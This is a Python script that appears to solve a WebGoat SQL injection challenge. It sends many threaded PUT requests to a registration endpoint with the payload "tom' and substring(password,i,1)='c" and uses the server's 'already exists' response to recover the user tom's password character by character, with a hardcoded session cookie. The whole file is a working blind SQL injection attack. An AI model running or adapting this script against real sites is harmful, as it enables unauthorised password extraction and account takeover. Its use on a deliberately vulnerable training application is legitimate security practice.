#!/usr/bin/env python
import requests
import json
from threading import Thread
import time

class ThreadWithReturnValue(Thread):
    def __init__(self, group=None, target=None, name=None,
                 args=(), kwargs={}, Verbose=None):
        Thread.__init__(self, group, target, name, args, kwargs, Verbose)
        self._return = None
    def run(self):
        if self._Thread__target is not None:
            self._return = self._Thread__target(*self._Thread__args,
                                                **self._Thread__kwargs)
    def join(self):
        Thread.join(self)
        return self._return





charset="abcdefghijklmnopqrstuvwxyz0123456789"

results = [None] * 30

global passu

JSessionID = "JSESSIONID=550D25F496F7849D220A02DE615EF848"



def main():
  threads = []
  tmp = ""
  passu = ""
  for i in range(1,30):
    tmp = passu
    for c in charset:
      threads.append(ThreadWithReturnValue(target=doRequest, args=(i, c)))
  i = 1
  for th in threads:
    th.start()
    time.sleep(0.02)
    print str(len(threads)) + "/" + str(i)
    i += 1
    
  for retval in threads:
    passu += retval.join()
  print "tom:" +  passu

def doRequest(i,c):
  headers = { "Host": "miksi.me:8080", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0", "Accept": "*/*", "Referer": "http://miksi.me:8080/WebGoat/start.mvc", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Content-Length": "60", "Connection": "keep-alive", "Cookie": JSessionID }

  r = None

  url = 'http://miksi.me:8080/WebGoat/SqlInjection/challenge'
  data1 = {"username_reg" : "tom' and substring(password,"+ str(i) +",1)='" + str(c), "email_reg" : "email@gmail.com", "password_reg" : "asd", "confirm_password_reg" : "asd"}

  r = requests.put(url, data=data1, headers=headers)

  res = r.text
  if "already exists" in res:
    return c
  else:
    return ""

if __name__=='__main__':
  main()
